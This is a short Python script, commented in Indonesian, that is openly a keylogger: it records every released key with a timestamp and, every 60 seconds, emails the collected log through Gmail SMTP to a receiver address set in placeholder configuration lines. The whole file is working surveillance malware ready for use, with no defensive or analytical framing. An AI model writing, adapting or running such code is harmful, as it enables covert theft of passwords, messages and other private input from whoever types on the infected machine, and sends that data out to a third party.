import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# ====== KONFIGURASI EMAIL ======
EMAIL_USER = "youremail@gmail.com"       # email pengirim
EMAIL_PASS = "youpasssmtp"            # app password
EMAIL_RECEIVER = "youreemaillog@gmail.com"    # email penerima

log = ""

# ====== SIMPAN KEYSTROKE ======
def callback(event):
    global log
    log += f"{datetime.now()}: {event.name}\n"

keyboard.on_release(callback=callback)

# ====== KIRIM LOG VIA EMAIL ======
def send_log():
    global log
    if log.strip():  # hanya kirim kalau ada isi
        try:
            # Buat email dengan subjek & isi
            msg = MIMEMultipart()
            msg['From'] = EMAIL_USER
            msg['To'] = EMAIL_RECEIVER
            msg['Subject'] = f"Keylogger Log - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            body = f"Berikut adalah log tombol yang terekam:\n\n{log}"
            msg.attach(MIMEText(body, 'plain'))

            # Kirim via SMTP Gmail
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_USER, EMAIL_PASS)
            server.sendmail(EMAIL_USER, EMAIL_RECEIVER, msg.as_string())
            server.quit()
            print(f"[{datetime.now()}] Log sent successfully.")
        except Exception as e:
            print(f"Error sending log: {e}")

    log = ""  # reset log setelah kirim
    Timer(60, send_log).start()  # kirim lagi 60 detik, bisa diganti angka 60 nya bebas berapa detik

# ====== MULAI ======
send_log()
keyboard.wait()

